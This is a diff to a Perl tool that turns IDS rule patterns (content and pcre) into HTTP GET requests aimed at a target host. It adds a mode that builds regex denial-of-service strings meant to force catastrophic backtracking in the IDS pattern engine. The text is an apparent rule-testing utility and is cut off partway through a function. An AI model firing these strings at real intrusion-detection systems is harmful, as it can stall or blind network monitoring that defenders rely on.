@@ -5,6 +5,7 @@ use IO::Socket;
 use Getopt::Std;
 use Term::ANSIColor;
 use Time::HiRes qw(usleep nanosleep);
+use Try::Tiny;			#There are still bugs, this lets us not fail hard
 
 my $payload;
 my $content;
@@ -21,13 +22,164 @@ my @payload_peices;		#This array has all modifiers to said peices
 my @payload_metadata;	#This array has all socket metadata for each rule
 my $payloads;			#This variable has the number of rules read in	
 
+my $expression;
+my $ll;
+my $regex;
+my $string;
+my $qlimit = 50;
+#Some Metacharacter tokens...it's a weird hack, works great, I don't want to talk about it.
+my $openparentoken = 'Ksc8pdCnhh';
+my $closeparentoken = '2KzsuZTSrw';
+my $opensquaretoken = 'pQwCCbYXqB';
+my $closesquaretoken = 'UFa1N8tdjS';
+my $openbracetoken = 'yVvs4ukduq';
+my $closebracetoken = 'PvnD1hEwty';
+my $alternativetoken = 'IAnelK5Zgr';
+
 my %options=();						#For cli options
-getopts("t:r:d:he", \%options);		#Get the options passed
+getopts("t:r:d:hels", \%options);		#Get the options passed
 
 if (($options{t}) && ($options{r})) {
 	$base_packet = "GET /? HTTP/1.1\nHost: $options{t}\n\n";
 } else {
 	help();
+}
+
+sub lastlexeme ($) {
+	$ll = '';
+	$expression = shift;
+	chomp($expression);
+	$expression =~ s/\$$//;		#remove the anchor for hax reasons
+
+	start:
+
+	if ($expression =~ /[?+*}]\?$/) { 		#If the expression ends in laziness
+		$ll = 'x';							#just fucking give up and set it to 'x'
+		return;
+	}
+	if ($expression =~ /(\\?[^}?+*)\]\$])$/){		#is last character an atom
+		$ll = $1;									#if so, this is our last lexeme
+	}
+	if ($expression =~ /\]$/){					#is last character is a ]
+		if ($expression =~ /(\[[^\[]+)$/) {		#parse the character class
+			$ll = $1;		
+		}						
+	}
+	if ($expression =~ /\)$/){					#is last character is a )
+		if ($expression =~ /(\([^\(]+)$/) {		#parse the grouping
+			$ll = $1;		
+		}						
+	}	
+
+	#Quantifiers
+	#+
+	if ($expression =~ /\+$/) {							#If last character is +
+		if ($expression =~ /(\\?[^}?+*)\]\$]\+)$/){		#is last character an atom
+			$ll = $1;									#if so, this is our last lexeme
+		}
+		if ($expression =~ /\]\+$/){					#is last character is a ]
+			if ($expression =~ /(\[[^\[]+\+)$/) {		#parse the character class
+				$ll = $1;		
+			}						
+		}
+		if ($expression =~ /\)\+$/){					#is last character is a )
+			if ($expression =~ /(\([^\(]+\+)$/) {		#parse the grouping
+				$ll = $1;		
+			}						
+		}	
+	}
+	#{..}
+	if ($expression =~ /\{.+?\}$/) {						#If last character is }
+		if ($expression =~ /(\\?[^}?+*)\]\$]\{.+?\})$/){	#is last character an atom
+			$ll = $1;										#if so, this is our last lexeme
+		}
+		if ($expression =~ /\]\{.+?\}$/){					#is last character is a ]
+			if ($expression =~ /(\\?\[[^\[]+\{.+?\})$/) {	#parse the character class
+				$ll = $1;		
+			}						
+		}
+		if ($expression =~ /\)\{.+?\}$/){					#is last character is a )
+			if ($expression =~ /(\([^\(]+\{.+?\})$/) {		#parse the grouping
+				$ll = $1;		
+			}						
+		}	
+	}	
+
+	#?	
+	if ($expression =~ /\?$/) {							#If last character is ?
+		if ($expression =~ /(\\?[^}?+*)\]\$]\?)$/){		#is last character an atom
+			$expression =~ s/\Q$1\E$//;
+		}
+		if ($expression =~ /\]\?$/){					#is last character is a ]
+			if ($expression =~ /(\[[^\[]+\?)$/) {		#parse the character class
+				$expression =~ s/\Q$1\E$//;		
+			}						
+		}
+		if ($expression =~ /\)\?$/){					#is last character is a )
+			if ($expression =~ /(\([^\(]+\?)$/) {		#parse the grouping
+				$expression =~ s/\Q$1\E$//;		
+			}						
+		}
+		goto start;										#OMFG I used a goto
+	}
+
+	#*
+	if ($expression =~ /\*$/) {							#If last character is ?
+		if ($expression =~ /(\\?[^}?+*)\]\$]\*)$/){		#is last character an atom
+			$expression =~ s/\Q$1\E$//;
+		}
+		if ($expression =~ /\]\*$/){					#is last character is a ]
+			if ($expression =~ /(\[[^\[]+\*)$/) {		#parse the character class
+				$expression =~ s/\Q$1\E$//;		
+			}						
+		}
+		if ($expression =~ /\)\*$/){					#is last character is a )
+			if ($expression =~ /(\([^\(]+\*)$/) {		#parse the grouping
+				$expression =~ s/\Q$1\E$//;		
+			}						
+		}
+		if ($expression =~ /(\\\?\*|\\\*\*|\\\$\*|\\\$\*)$/) {		#do we end with a \?*, \** \$?, or \$*
+			$expression =~ s/\Q$1\E$//;					#remove that
+		}
+		goto start;										#OMFG I used a goto
+	}	
+
+	#{0,}  \{0.+
+	if ($expression =~ /{0.+$/) {						#If last characters are {0,#}
+		if ($expression =~ /(\\?[^}?+*)\]\$]{0.+)$/){	#is last character an atom
+			$expression =~ s/\Q$1\E$//;
+		}
+		if ($expression =~ /\]{0.+$/){					#is last character is a ]
+			if ($expression =~ /(\[[^\[]+{0.+)$/) {		#parse the character class
+				$expression =~ s/\Q$1\E$//;		
+			}						
+		}
+		if ($expression =~ /\){0.+$/){					#is last character is a )
+			if ($expression =~ /(\([^\(]+{0.+)$/) {		#parse the grouping
+				$expression =~ s/\Q$1\E$//;		
+			}						
+		}
+		goto start;										#OMFG I used a goto
+	}		
+
+	return $ll;
+}
+
+sub negatelex ($) {
+	my $negate = shift;
+	#This charlist is in a specific order; within the first few chars, one of them should negate the expression, otherwise, try all the rest
+	my @chars = ('a','1','@',' ','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','2','3','4','5','6','7','8','9','0','~','!','#','$','%','^','&','*','(',')','_','+','-','=','[',']','{','}','\\','|',';',':',',','<','.','>','/','?','`');
+	try {
+		foreach (@chars) {
+			if ($_ !~ $negate) {
+				return $_;
+			}
+		}
+		return "@";		#Didn't find a negation (this can happen if the last lexeme is a '.')
+
+	} catch {
+		return '@';		#There was an error with the lexeme, don't worry about it though, just make it an @ as well
+	};
 }
 
 sub filters($) {
@@ -163,10 +315,10 @@ while ($count < $payloads) {								#while we still have rules
 	my $j = 0;	
 	$content_counter = 0;									#init content/pcre/uricontent counter
 	$pcre_counter = 0;
-	print color 'bold blue';
-	print "sid:$payload_metadata[$count][5]\n";	
-	print color 'reset';
-	print "GET /?";
+	print color 'bold blue' if !$options{s};
+	print "sid:$payload_metadata[$count][5]\n" if !$options{s};
+	print color 'reset' if !$options{s};
+	print "GET /?" if !$options{s};
 	while ($payload_data[$count][$j]) {						#while we still have content/pcre/uricontent elements
 		$sub_packet = "$payload_data[$count][$j]\n";		#grab the element
  		#is the element "content"? if so, handle with content() sub
@@ -174,8 +326,8 @@ while ($count < $payloads) {								#while we still have rules
     		$sub_packet = $1;								#put it in global variable for sub
     		content();										#run sub
     		$packet_content[$count][$content_counter] = $sub_packet;
-    		print color 'green';
-    		print $packet_content[$count][$content_counter];
+    		print color 'green' if !$options{s};
+    		print $packet_content[$count][$content_counter] if !$options{s};
     		$packets[$count] =~ s/(GET \/\?.*)( HTTP\/1.1.+)/$1$packet_content[$count][$content_counter]$2/s;
     		$content_counter++;
     	}	
@@ -183,19 +335,46 @@ while ($count < $payloads) {								#while we still have rules
     	if ($sub_packet =~ /^content:!"(.+?)";.+$/) { 		#parse the peice between ""'s in content
     		$sub_packet = 'lol';							#if so, doesn't really matter what we inject
     		$packet_content[$count][$content_counter] = $sub_packet; 
-    		print color 'magenta';
-    		print $packet_content[$count][$content_counter];    		
+    		print color 'magenta' if !$options{s};
+    		print $packet_content[$count][$content_counter] if !$options{s};  		
     		$packets[$count] =~ s/(GET \/\?.*)( HTTP\/1.1.+)/$1$packet_content[$count][$content_counter]$2/s;    		  		
     		$content_counter++;    		
     	}	    	
  		#is the element "pcre"? if so, handle with pcre() sub
     	if ($sub_packet =~ /^pcre:"\/(.+)\/.*";.+$/) { 		#parse the peice between ""'s in content
     		$sub_packet = $1;								#put it in global variable for sub
-    		pcre();											#run sub
+
+
+    		if ($options{l}){
+    			#Create Denial of Service string
+				try {
+					my $endanchor = 'no';
+					my $orig_exp = $sub_packet;
+					if ($orig_exp =~ /\$$/) {							#if this is an end anchored expression
+						$endanchor = 'yes';						#make note
+					}
+					my $last_l = lastlexeme($orig_exp);				#get last lexeme
+					my $neg_l = negatelex(lastlexeme($orig_exp));		#get minimal negation of it
+					$regex = $string = $orig_exp;						#get our expression
+					if ($endanchor eq 'yes') {
+						my $last_l_norm = pcre_dos($last_l);
+						$neg_l = $last_l_norm . $neg_l;
+					}
+					$regex =~ s/\Q$last_l\E.*$/$neg_l/;			#sub last lexeme with literal bad/negation part
+					$regex = pcre_dos($regex);		#pass through again
+				} catch {
+					$regex = "I'm a stupid payload, becuase 8ball couldn't DoS\n";
+				};
+    		} else {
+    			pcre();			#do simple (efficient) string
+    		}
+    		$sub_packet = $regex;
+
+
     		$packet_content[$count][$pcre_counter] = $sub_packet;  
     		#$packets[$count] =~ s/(GET \/\?.*)(HTTP\/1.1.+)/$1$2/s;	
-    		print color 'red';
-    		print $packet_content[$count][$pcre_counter];    				
+    		print color 'red' if !$options{s};
+    		print $packet_content[$count][$pcre_counter] if !$options{s};   				
     		$packets[$count] =~ s/(GET \/\?.*)( HTTP\/1.1.+)/$1$packet_content[$count][$pcre_counter]$2/s;			 		
     		$pcre_counter++;    		
     	}	    	
@@ -203,13 +382,13 @@ while ($count < $payloads) {								#while we still have rules
 		$j++												#inc
 	}
 
-	print($socket "$packets[$count]") if $packets[$count];
+	#print($socket "$packets[$count]") if $packets[$count];
 	close $socket;
 	#usleep(100000);	
 	#usleep(10000);
 	usleep($options{d}) if $options{d};
-	print color 'reset';
-	print " HTTP/1.1\nHost: $options{t}\n\n";
+	print color 'reset' if !$options{s};
+	print " HTTP/1.1\nHost: $options{t}\n\n" if !$options{s};
 	$count++;												#inc
 }
 #96747
@@ -238,120 +417,403 @@ sub content {
 }
 
 sub pcre {
-	my $regex = $sub_packet;
+	#Tokenize some metacharacters
+	my $pcre = $sub_packet;
+	$pcre =~ s/\\\(/$openparentoken/g;
+	$pcre =~ s/\\x28/$openparentoken/g;	
+	$pcre =~ s/\\\)/$closeparentoken/g;
+	$pcre =~ s/\\x29/$closeparentoken/g;			
+	$pcre =~ s/\\\[/$opensquaretoken/g;
+	$pcre =~ s/\\x5b/$opensquaretoken/gi;	
+	$pcre =~ s/\\\]/$closesquaretoken/g;
+	$pcre =~ s/\\x5d/$closesquaretoken/gi;	
+	$pcre =~ s/\\\{/$openbracetoken/g;
+	$pcre =~ s/\\x7b/$openbracetoken/gi;	
+	$pcre =~ s/\\\}/$closebracetoken/g;
+	$pcre =~ s/\\x7d/$closebracetoken/gi;	
+	$pcre =~ s/\\\|/$alternativetoken/g;
+	$pcre =~ s/\\x7c/$alternativetoken/gi;	
+
+	#Handle {\d,} situation
+	$pcre =~ s/(\{\d+),(\})/$1,2$2/g;
+
+	#We don't care about non-capturing groups
+	$pcre =~ s/\(\?:/(/g;
+
+	#Experimental Lookarounds:
+	$pcre =~ s/\(\?=/(/g;	
+	$pcre =~ s/\(\?!.+?\)/(a)/g;	
+	$pcre =~ s/\(\?<=/(/g;	
+	$pcre =~ s/\(\?<!.+?\)/(a)/g;						
+
 	#Handle Anchors (drop them, as they match anyway as a side effect)
-	$regex =~ s/^\^//;
-	$regex =~ s/\$$//;
+	$pcre =~ s/^\^//;
+	$pcre =~ s/\$$//;
 
 	#Character Classes (Needs some Expansion)
-	$regex =~ s/\\s/ /g;		#Handle regex whitespace (replace with 1 space
-	$regex =~ s/\\w/a/g;		#handle regex alphanumeric (replace with an "a")
-	$regex =~ s/\\d/1/g;		#handle regex digits (replace with a 1)
+	$pcre =~ s/\\s/ /g;		#Handle regex whitespace (replace with 1 space
+	$pcre =~ s/\\w/a/g;		#handle regex alphanumeric (replace with an "a")
+	$pcre =~ s/\\d/1/g;		#handle regex digits (replace with a 1)
+	$pcre =~ s/\\S/a/g;		#Handle regex non-whitespace (replace with 1 "a"
+	$pcre =~ s/\\W/ /g;		#handle regex non-alphanumeric (replace with an space)
+	$pcre =~ s/\\D/a/g;		#handle regex non-digits (replace with 1 "a")
 
-	$regex =~ s/([^\}\\])\./$1a/g;	#replace "." with "a" if not preceded by \ or }
+	$pcre =~ s/([^\}\\])\./$1a/g;	#replace "." with "a" if not preceded by \ or }
 
 	#Kill lazyness
 	#If we get *? or +?, drop the ?
-	$regex =~ s/\*\?/*/g;
-	$regex =~ s/\+\?/+/g;
+	$pcre =~ s/\*\?/*/g;
+	$pcre =~ s/\+\?/+/g;
+	$pcre =~ s/\?\?/+/g;	
 
+	my $replacement = '';
 	#Quantifiers (Done)
-	$regex =~ s/([^\\])\+/$1/g;		#handle 1 or more (remove the +, thing preceding it stays, wich is equivilant to 1)
-	$regex =~ s/([^\\])\*/$1/g;		#handle 0, 1, or more (remove the *, thing preceding it stays, wich is equivilant to 1)
-	$regex =~ s/([^\\])\?/$1/g;		#handle 0 or 1 (remove the ?, thing preceding it stays, wich is equivilant to 1)
+	$pcre =~ s/([^\\])\+/$1/g;		#handle 1 or more (remove the +, thing preceding it stays, wich is equivilant to 1)
+	$pcre =~ s/([^\\])\*/$1/g;		#handle 0, 1, or more (remove the *, thing preceding it stays, wich is equivilant to 1)
+	$pcre =~ s/([^\\])\?/$1/g;		#handle 0 or 1 (remove the ?, thing preceding it stays, wich is equivilant to 1)
 
 	#Literals (Needs some Expansion
-	$regex =~ s/\\\././g;		#handle literal periods (replace with \. with .)
-	$regex =~ s/\\\//\//g;		#handle literal forward slashes (replace with \/ with /)
-	$regex =~ s/\\\?/\?/g;		#handle literal ?'s (replace with \? with ?)
-	$regex =~ s/\\\-/\-/g;		#handle literal -'s
-	$regex =~ s/\\\\/\\/g;		#handle literal \'s		
-	$regex =~ s/\\\]/\]/g;		#handle literal ]'s	
-	$regex =~ s/\\\(/\(/g;		#handle literal ('s
-	$regex =~ s/\\\)/\)/g;		#handle literal )'s
-	$regex =~ s/\\\*/\*/g;		#handle literal *'s
-	$regex =~ s/\\\|/\|/g;		#handle literal |'s
-	$regex =~ s/\\\{/\{/g;		#handle literal {'s
-	$regex =~ s/\\\}/\}/g;		#handle literal }'s
-	$regex =~ s/\\\;/\;/g;		#handle literal ;'s
-	$regex =~ s/\\\%/\%/g;		#handle literal %'s
-	$regex =~ s/\\\:/\:/g;		#handle literal :'s
-	$regex =~ s/\\\r/\r/g;		#handle literal \r's
-	$regex =~ s/\\\n/\n/g;		#handle literal \n's
-	$regex =~ s/\\\$/\$/g;		#handle literal \$'s
+	$pcre =~ s/\\\././g;		#handle literal periods (replace with \. with .)
+	$pcre =~ s/\\\//\//g;		#handle literal forward slashes (replace with \/ with /)
+	$pcre =~ s/\\\?/\?/g;		#handle literal ?'s (replace with \? with ?)
+	$pcre =~ s/\\\-/\-/g;		#handle literal -'s
+	$pcre =~ s/\\\\/\\/g;		#handle literal \'s		
+	$pcre =~ s/\\\]/\]/g;		#handle literal ]'s	
+	$pcre =~ s/\\\[/\[/g;		#handle literal ['s		
+	$pcre =~ s/\\\(/\(/g;		#handle literal ('s
+	$pcre =~ s/\\\)/\)/g;		#handle literal )'s
+	$pcre =~ s/\\\*/\*/g;		#handle literal *'s
+	$pcre =~ s/\\\|/\|/g;		#handle literal |'s
+	$pcre =~ s/\\\{/\{/g;		#handle literal {'s
+	$pcre =~ s/\\\}/\}/g;		#handle literal }'s
+	$pcre =~ s/\\\;/\;/g;
+	$pcre =~ s/\\\%/\%/g;		#handle literal %'s
+	$pcre =~ s/\\\:/\:/g;		#handle literal :'s
+	$pcre =~ s/\\\&/\&/g;		#handle literal &'s	
+	$pcre =~ s/\\\=/\=/g;		#handle literal ='s		
+	$pcre =~ s/\\\ /\ /g;		#handle literal spaces's			
+	$pcre =~ s/\\r/\x0d/g;		#handle literal \r's
+	$pcre =~ s/\\n/\x0a/g;		#handle literal \n's
+	$pcre =~ s/\\\$/\$/g;		#handle literal \$'s
 
 	#handle hex encoding
-	while ($regex =~ /\\x([0-9a-f]{2})/i) {
+	while ($pcre =~ /\\x([0-9a-f]{2})/i) {
 	my $hex = pack("C*", map { $_ ? hex($_) :() } split(/\\x/, $1));
-	$regex =~ s/\\x([0-9a-f]{2})/$hex/i
+	$pcre =~ s/\\x([0-9a-f]{2})/$hex/i;
 	}
 
 	#handle character classes []'s, just take the first character for each []
 	#In the case of a negated class [^abc], the "^" character gets picked as a 
 	#side effect, which is still fine. [^^] is accounted for as well.
-	while ($regex =~ /\[(.)(.*?)\]/) {
+	while ($pcre =~ /\[(.)(.*?)\]/) {		#get [$1$2] where $1 is only one char and $2 is whats left
 		my $class = $1;
 		my $extra = $2;
 		if (($class eq '^') && ($extra) && (($extra =~ /\^/) || ($extra =~ /^\\/))) {
-			$regex =~ s/\[(.).*?\]/a/;	#handles a special negated class of [^^]
+			$pcre =~ s/\[(.).*?\]/a/;	#handles a special negated class of [^^]
 		} else {
 			if ($class eq '\\') {									#if it starts with a \
-				$regex =~ s/\[(.).*?\[/\[/ if ($extra =~ /^\[/);		#if next char is \, then replace with c
-				$regex =~ s/\[(.).*?\]/\]/ if ($extra =~ /^\]/);
-				$regex =~ s/\[(.).*?\]/\r/ if ($extra =~ /^r/i);		
-				$regex =~ s/\[(.).*?\]/\n/ if ($extra =~ /^n/i);
-				$regex =~ s/\[(.).*?\]/x/ if ($extra =~ /^s/i);	
-				$regex =~ s/\[(.).*?\]/\:/ if ($extra =~ /^:/);
-				$regex =~ s/\[(.).*?\]/\(/ if ($extra =~ /^\(/);
-				$regex =~ s/\[(.).*?\]/\)/ if ($extra =~ /^\)/);
-				$regex =~ s/\[(.).*?\]/\;/ if ($extra =~ /^\;/);
-				$regex =~ s/\[(.).*?\]/\*/ if ($extra =~ /^\*/);
-				$regex =~ s/\[(.).*?\]/\\/ if ($extra =~ /^\\/);
-				$regex =~ s/\[(.).*?\]/\|/ if ($extra =~ /^\|/);
-				$regex =~ s/\[(.).*?\]/\{/ if ($extra =~ /^\{/);
-				$regex =~ s/\[(.).*?\]/\}/ if ($extra =~ /^\}/);
-				$regex =~ s/\[(.).*?\]/\%/ if ($extra =~ /^\%/);
-				$regex =~ s/\[(.).*?\]/\$/ if ($extra =~ /^\$/);
-				$regex =~ s/\[(.).*?\]/\\/ if ($extra eq '');		
+				#if extra starts with [, then replace [$1$2] with [
+					#So [\[] is converted to just a [ (and etc... for the rest of these)
+				$pcre =~ s/\[(.).*?\[/\[/ if ($extra =~ /^\[/);
+				$pcre =~ s/\[(.).*?\]/\]/ if ($extra =~ /^\]/);
+				$pcre =~ s/\[(.).*?\]/\x0d/ if ($extra =~ /^r/i);		
+				$pcre =~ s/\[(.).*?\]/\x0a/ if ($extra =~ /^n/i);
+				$pcre =~ s/\[(.).*?\]/x/ if ($extra =~ /^s/i);
+				$pcre =~ s/\[(.).*?\]/\:/ if ($extra =~ /^:/);
+				$pcre =~ s/\[(.).*?\]/\(/ if ($extra =~ /^\(/);
+				$pcre =~ s/\[(.).*?\]/\)/ if ($extra =~ /^\)/);
+				$pcre =~ s/\[(.).*?\]/\;/ if ($extra =~ /^\;/);
+				$pcre =~ s/\[(.).*?\]/\*/ if ($extra =~ /^\*/);
+				$pcre =~ s/\[(.).*?\]/\\/ if ($extra =~ /^\\/);
+				$pcre =~ s/\[(.).*?\]/\\/ if ($extra =~ /^\//);				
+				$pcre =~ s/\[(.).*?\]/\\/ if ($extra eq '');				
+				$pcre =~ s/\[(.).*?\]/\|/ if ($extra =~ /^\|/);
+				$pcre =~ s/\[(.).*?\]/\{/ if ($extra =~ /^\{/);
+				$pcre =~ s/\[(.).*?\]/\}/ if ($extra =~ /^\}/);
+				$pcre =~ s/\[(.).*?\]/\%/ if ($extra =~ /^\%/);
+				$pcre =~ s/\[(.).*?\]/\$/ if ($extra =~ /^\$/);
+				$pcre =~ s/\[(.).*?\]/\+/ if ($extra =~ '^\+');	
+				$pcre =~ s/\[(.).*?\]/\&/ if ($extra =~ '^\&');		
+				$pcre =~ s/\[(.).*?\]/\=/ if ($extra =~ '^\=');	
+				$pcre =~ s/\[(.).*?\]/\!/ if ($extra =~ '^\!');
+				$pcre =~ s/\[(.).*?\]/\@/ if ($extra =~ '^\@');
+				$pcre =~ s/\[(.).*?\]/\^/ if ($extra =~ '^^');														
+				$pcre =~ s/\[(.).*?\]/\ / if ($extra =~ '^\ ');
+				$pcre =~ s/\[(.).*?\]/\t/ if ($extra =~ '^t');				
+				#gracefully handle unicode, results are a failure, but prevents infinite loop
+				$pcre =~ s/\[(.).*?\]/\u/ if ($extra =~ '^u');														
 			} else {
-				$regex =~ s/\[(.).*?\]/$class/;
+				$pcre =~ s/\[(.).*?\]/$class/;
 			}
 		}
 	}
 
-	#{30,613} {34}
 	#handle {}'s, take the only or first number and repeat that many times
 	#This one is probably the most complicated, must be done before ()'s
-	while ($regex =~ /(\))?\{(\d).*?\}/s){
+	while ($pcre =~ /(\))?\{(\d).*?\}/s){
 		my $grouper = $1;
 		my $digit = $+;
 		my $char;
 		if (!$grouper) {
-			if ($regex =~ /(.)\{(\d+).*?\}/s) {
+			if ($pcre =~ /(.)\{(\d+).*?\}/s) {
 				$char = $1;
 				$digit = $2;
 				$char = $char x $digit;	
 			}
-			$regex =~ s/.\{(\d).*?\}/$char/s;
+			$pcre =~ s/.\{(\d).*?\}/$char/s;
 		} else {
-			if ($regex =~ /(\(.+?\))\{(\d+).*?\}/s) {
+			if ($pcre =~ /(\(.+?\))\{(\d+).*?\}/s) {
 				$char = $1;
 				$digit = $2;
 				$char = $char x $digit;
 			}
-			$regex =~ s/(\(.+?\))\{(\d).*?\}/$char/s;
+			$pcre =~ s/(\(.+?\))\{(\d).*?\}/$char/s;
 		}
 	}
 
-	#handle grouping ()'s, take the first alternation in ()'s
-	while ($regex =~ /\((.+?)\|.+?\)/){
-		$regex =~ s/\((.+?)\|.+?\)/$1/;
+	#handle grouping ()'s, take the last alternation in ()'s
+	while ($pcre =~ /\(([^)]+?)\|.?\)/s){		#while we still have a group
+
+		#Do something with it
+		$pcre =~ s/\((.+?)\|.*?\)/$1/s; 		#this replaces with first option
 	}
 
 	#remove gratuitus parenthesis
-	$regex =~ s/\(|\)//g;
-	$sub_packet = $regex;
+	$pcre =~ s/\(|\)//g;
+
+	#Reintroduce tokenized metacharacters as literal
+	$pcre =~ s/$openparentoken/(/g;
+	$pcre =~ s/$closeparentoken/)/g;
+	$pcre =~ s/$opensquaretoken/[/g;
+	$pcre =~ s/$closesquaretoken/]/g;
+	$pcre =~ s/$openbracetoken/{/g;
+	$pcre =~ s/$closebracetoken/}/g;	
+	$pcre =~ s/$alternativetoken/|/g;	
+
+	$regex = $pcre;					
 }
+
+sub pcre_dos {
+	#Tokenize some metacharacters
+	my $pcre = shift;
+	$pcre =~ s/\\\(/$openparentoken/g;
+	$pcre =~ s/\\x28/$openparentoken/g;	
+	$pcre =~ s/\\\)/$closeparentoken/g;
+	$pcre =~ s/\\x29/$closeparentoken/g;			
+	$pcre =~ s/\\\[/$opensquaretoken/g;
+	$pcre =~ s/\\x5b/$opensquaretoken/gi;	
+	$pcre =~ s/\\\]/$closesquaretoken/g;
+	$pcre =~ s/\\x5d/$closesquaretoken/gi;	
+	$pcre =~ s/\\\{/$openbracetoken/g;
+	$pcre =~ s/\\x7b/$openbracetoken/gi;	
+	$pcre =~ s/\\\}/$closebracetoken/g;
+	$pcre =~ s/\\x7d/$closebracetoken/gi;	
+	$pcre =~ s/\\\|/$alternativetoken/g;
+	$pcre =~ s/\\x7c/$alternativetoken/gi;	
+
+	#Handle {\d,} situation
+	$pcre =~ s/(\{\d+),(\})/$1,100$2/g;
+
+	#We don't care about non-capturing groups
+	$pcre =~ s/\(\?:/(/g;
+
+	#Experimental Lookarounds:
+	$pcre =~ s/\(\?=/(/g;	
+	$pcre =~ s/\(\?!.+?\)/(a)/g;	
+	$pcre =~ s/\(\?<=/(/g;	
+	$pcre =~ s/\(\?<!.+?\)/(a)/g;						
+
+	#Handle Anchors (drop them, as they match anyway as a side effect)
+	$pcre =~ s/^\^//;
+	$pcre =~ s/\$$//;
+
+	#Character Classes (Needs some Expansion)
+	$pcre =~ s/\\s/ /g;		#Handle regex whitespace (replace with 1 space
+	$pcre =~ s/\\w/a/g;		#handle regex alphanumeric (replace with an "a")
+	$pcre =~ s/\\d/1/g;		#handle regex digits (replace with a 1)
+	$pcre =~ s/\\S/a/g;		#Handle regex non-whitespace (replace with 1 "a"
+	$pcre =~ s/\\W/ /g;		#handle regex non-alphanumeric (replace with an space)
+	$pcre =~ s/\\D/a/g;		#handle regex non-digits (replace with 1 "a")
+
+	$pcre =~ s/([^\}\\])\./$1a/g;	#replace "." with "a" if not preceded by \ or }
+
+	#Kill lazyness
+	#If we get *? or +?, drop the ?
+	$pcre =~ s/\*\?/*/g;
+	$pcre =~ s/\+\?/+/g;
+	$pcre =~ s/\?\?/+/g;	
+
+	my $replacement = '';
+	#Quantifiers (Done)
+	#below is the non-evil version of the + modifier
+	#$pcre =~ s/([^\\])\+/$1/g;		#handle 1 or more (remove the +, thing preceding it stays, wich is equivilant to 1)
+	while ($pcre =~ /([^\\+])\+(?<!\+)/) {		#Is there still an unescaped + quantifier with no surrounding +'s
+		$replacement = "$1" x 50;				#If so, take what we are quantifying up to 50
+		$pcre =~ s/([^\\])\+/$replacement/;		#replace that ONE instance with the 50x version (non global; becuase the replacement changes per iteration)
+	}
+	#below is the non-evil version of the * modifier
+	#$pcre =~ s/([^\\])\*/$1/g;		#handle 0, 1, or more (remove the *, thing preceding it stays, wich is equivilant to 1)
+	while ($pcre =~ /([^\\])\*/) {				#Is there still a + quantifier
+		$replacement = "$1" x 50;				#If so, take what we are quantifying up to 50
+		$pcre =~ s/([^\\])\*/$replacement/;		#replace that ONE instance with the 50x version (non global; becuase the replacement changes per iteration)
+	}
+	$pcre =~ s/([^\\])\?/$1/g;		#handle 0 or 1 (remove the ?, thing preceding it stays, wich is equivilant to 1)
+
+	#Literals (Needs some Expansion
+	$pcre =~ s/\\\././g;		#handle literal periods (replace with \. with .)
+	$pcre =~ s/\\\//\//g;		#handle literal forward slashes (replace with \/ with /)
+	$pcre =~ s/\\\?/\?/g;		#handle literal ?'s (replace with \? with ?)
+	$pcre =~ s/\\\-/\-/g;		#handle literal -'s
+	$pcre =~ s/\\\\/\\/g;		#handle literal \'s		
+	$pcre =~ s/\\\]/\]/g;		#handle literal ]'s	
+	$pcre =~ s/\\\[/\[/g;		#handle literal ['s		
+	$pcre =~ s/\\\(/\(/g;		#handle literal ('s
+	$pcre =~ s/\\\)/\)/g;		#handle literal )'s
+	$pcre =~ s/\\\*/\*/g;		#handle literal *'s
+	$pcre =~ s/\\\|/\|/g;		#handle literal |'s
+	$pcre =~ s/\\\{/\{/g;		#handle literal {'s
+	$pcre =~ s/\\\}/\}/g;		#handle literal }'s
+	$pcre =~ s/\\\;/\;/g;
+	$pcre =~ s/\\\%/\%/g;		#handle literal %'s
+	$pcre =~ s/\\\:/\:/g;		#handle literal :'s
+	$pcre =~ s/\\\&/\&/g;		#handle literal &'s	
+	$pcre =~ s/\\\=/\=/g;		#handle literal ='s		
+	$pcre =~ s/\\\ /\ /g;		#handle literal spaces's			
+	$pcre =~ s/\\r/\x0d/g;		#handle literal \r's
+	$pcre =~ s/\\n/\x0a/g;		#handle literal \n's
+	$pcre =~ s/\\\$/\$/g;		#handle literal \$'s
+
+	#handle hex encoding
+	while ($pcre =~ /\\x([0-9a-f]{2})/i) {
+	my $hex = pack("C*", map { $_ ? hex($_) :() } split(/\\x/, $1));
+	$pcre =~ s/\\x([0-9a-f]{2})/$hex/i;
+	}
+
+	#handle character classes []'s, just take the first character for each []
+	#In the case of a negated class [^abc], the "^" character gets picked as a 
+	#side effect, which is still fine. [^^] is accounted for as well.
+	while ($pcre =~ /\[(.)(.*?)\]/) {		#get [$1$2] where $1 is only one char and $2 is whats left
+		my $class = $1;
+		my $extra = $2;
+		if (($class eq '^') && ($extra) && (($extra =~ /\^/) || ($extra =~ /^\\/))) {
+			$pcre =~ s/\[(.).*?\]/a/;	#handles a special negated class of [^^]
+		} else {
+			if ($class eq '\\') {									#if it starts with a \
+				#if extra starts with [, then replace [$1$2] with [
+					#So [\[] is converted to just a [ (and etc... for the rest of these)
+				$pcre =~ s/\[(.).*?\[/\[/ if ($extra =~ /^\[/);
+				$pcre =~ s/\[(.).*?\]/\]/ if ($extra =~ /^\]/);
+				$pcre =~ s/\[(.).*?\]/\x0d/ if ($extra =~ /^r/i);		
+				$pcre =~ s/\[(.).*?\]/\x0a/ if ($extra =~ /^n/i);
+				$pcre =~ s/\[(.).*?\]/x/ if ($extra =~ /^s/i);
+				$pcre =~ s/\[(.).*?\]/\:/ if ($extra =~ /^:/);
+				$pcre =~ s/\[(.).*?\]/\(/ if ($extra =~ /^\(/);
+				$pcre =~ s/\[(.).*?\]/\)/ if ($extra =~ /^\)/);
+				$pcre =~ s/\[(.).*?\]/\;/ if ($extra =~ /^\;/);
+				$pcre =~ s/\[(.).*?\]/\*/ if ($extra =~ /^\*/);
+				$pcre =~ s/\[(.).*?\]/\\/ if ($extra =~ /^\\/);
+				$pcre =~ s/\[(.).*?\]/\\/ if ($extra =~ /^\//);				
+				$pcre =~ s/\[(.).*?\]/\\/ if ($extra eq '');				
+				$pcre =~ s/\[(.).*?\]/\|/ if ($extra =~ /^\|/);
+				$pcre =~ s/\[(.).*?\]/\{/ if ($extra =~ /^\{/);
+				$pcre =~ s/\[(.).*?\]/\}/ if ($extra =~ /^\}/);
+				$pcre =~ s/\[(.).*?\]/\%/ if ($extra =~ /^\%/);
+				$pcre =~ s/\[(.).*?\]/\$/ if ($extra =~ /^\$/);
